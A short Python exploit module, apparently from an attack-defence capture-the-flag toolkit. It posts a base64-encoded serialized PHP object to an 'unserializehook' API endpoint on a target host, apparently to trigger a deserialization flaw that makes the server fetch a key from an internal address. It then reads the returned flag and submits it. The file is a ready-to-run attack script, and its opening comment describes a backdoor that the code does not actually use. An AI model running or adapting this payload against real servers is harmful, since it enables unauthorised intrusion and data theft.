'''
This is a default payload
if there is a backdoor in upload/upload.php,and key is pass
The real situation is much more complex
'''
import sys
import base64
sys.path.append('..')
from models.payload import Payload,PayloadFailException
import requests
from models.horse import Horse
from utils import Utils
from modules.flag.flag import sendFlag
import json

class P(Payload):
    def __init__(self,host):
        super().__init__(host,mode='execute')
    def execute(self):
        try:
            url = 'http://{0}/home/Api/unserializehook.html'.format(self.host)
            res = requests.post(url,data={
                'seridata':"TzoxMDoibXlsaWJcRmlsZSI6Mjp7czo4OiJmaWxlbmFtZSI7czoyNzoiaHR0cDovLzE5Mi4xNjguMTAwLjEvR2V0a2V5IjtzOjc6ImNvbnRlbnQiO047fQ=="
            },timeout=2)
            if res.status_code == 200:
                flag = res.text
                if not flag:
                    raise PayloadFailException('GET FLAG FAIL')
                msg = sendFlag(flag)
                return [flag,msg]
            else:
                raise PayloadFailException('simple horse write fail')
        except Exception as e:
            raise PayloadFailException(str(e))